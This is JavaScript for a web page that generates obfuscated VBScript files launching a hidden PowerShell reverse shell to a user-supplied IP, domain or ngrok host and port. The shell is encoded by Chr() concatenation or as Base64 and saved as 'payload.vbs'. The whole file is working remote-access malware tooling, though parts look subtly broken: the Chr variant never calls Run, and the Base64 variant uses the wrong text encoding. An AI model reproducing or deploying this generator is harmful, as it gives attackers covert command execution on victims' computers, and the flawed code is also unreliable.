document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalMessage = document.getElementById('modal-message');
    const modalClose = document.querySelector('.modal-close');
    const modalOk = document.getElementById('modal-ok');
    
    const vbsFileInput = document.getElementById('vbs-file-input');
    const vbsBrowseBtn = document.getElementById('vbs-browse');
    const vbsFileName = document.getElementById('vbs-file-name');
    
    // Improved file browsing that works on all devices
    function setupFileInput() {
        // For mobile devices, we need to trigger the click differently
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            // Mobile device detected
            vbsBrowseBtn.addEventListener('touchstart', function(e) {
                e.preventDefault();
                vbsFileInput.click();
            }, { passive: false });
        } else {
            // Desktop device
            vbsBrowseBtn.addEventListener('click', () => {
                vbsFileInput.click();
            });
        }
        
        vbsFileInput.addEventListener('change', () => {
            if (vbsFileInput.files.length > 0) {
                vbsFileName.textContent = vbsFileInput.files[0].name;
            } else {
                vbsFileName.textContent = 'No file selected';
            }
        });
    }
    
    setupFileInput();

    function showModal(title, message, isError = false) {
        modalTitle.textContent = title;
        modalMessage.textContent = message;
        modal.style.display = 'flex';
        modalTitle.style.color = isError ? 'var(--danger)' : 'var(--secondary)';
    }
    
    modalClose.addEventListener('click', () => modal.style.display = 'none');
    modalOk.addEventListener('click', () => modal.style.display = 'none');
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.style.display = 'none';
    });

    function validateIpOrDomain(value) {
        const ipPattern = /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        const domainPattern = /^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,6}$/;
        const ngrokPattern = /^[a-zA-Z0-9\-]+\.tcp\.([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}$/;
        return ipPattern.test(value) || domainPattern.test(value) || ngrokPattern.test(value);
    }
    
    function validatePort(port) {
        return port > 0 && port <= 65535;
    }
    
    function powershellReverseShell(ip, port) {
        return (
            `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
            "$stream = $client.GetStream();" +
            "$writer = New-Object System.IO.StreamWriter($stream);" +
            "$buffer = New-Object System.Byte[] 1024;" +
            "$encoding = New-Object System.Text.ASCIIEncoding;" +
            "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){" +
            "$command = $encoding.GetString($buffer, 0, $read);" +
            "$output = cmd.exe /c $command 2>&1 | Out-String;" +
            "$writer.WriteLine($output);" +
            "$writer.Flush()" +
            "}"
        );
    }
    
    function obfuscateChr(text) {
        return '""' + text.split('').map(c => ` & Chr(${c.charCodeAt(0)})`).join('');
    }
    
    function downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename.endsWith('.vbs') ? filename : `${filename}.vbs`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }
    
    // Tombol Generate CHR Method
    document.getElementById('generate-chr').addEventListener('click', () => {
        const ip = document.getElementById('ip').value.trim();
        const port = parseInt(document.getElementById('port').value);
        const filename = document.getElementById('filename').value || 'payload.vbs';
        
        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
        
        try {
            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
            const payload = powershellReverseShell(ip, port);
            const obfPayload = obfuscateChr(payload);
            const vbsContent = (
                'Set x = CreateObject("WScript.Shell")\n' +
                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
            );
            
            document.getElementById('vbs-output').value = vbsContent;
            downloadFile(vbsContent, filename);
            showModal('Success', 'CHR method VBS generated and saved!');
        } catch (e) {
            showModal('Error', `Generation failed: ${e.message}`, true);
        }
    });
    
    // Tombol Generate Base64 Method
    document.getElementById('generate-b64').addEventListener('click', () => {
        const ip = document.getElementById('ip').value.trim();
        const port = parseInt(document.getElementById('port').value);
        const filename = document.getElementById('filename').value || 'payload.vbs';
        
        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
        
        try {
            const payload = powershellReverseShell(ip, port);
            const encoded = btoa(unescape(encodeURIComponent(payload)));
            const vbsContent = (
                'Set shell = CreateObject("Wscript.Shell")\n' +
                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
            );
            
            document.getElementById('vbs-output').value = vbsContent;
            downloadFile(vbsContent, filename);
            showModal('Success', 'Base64 method VBS generated and saved!');
        } catch (e) {
            showModal('Error', `Generation failed: ${e.message}`, true);
        }
    });
});
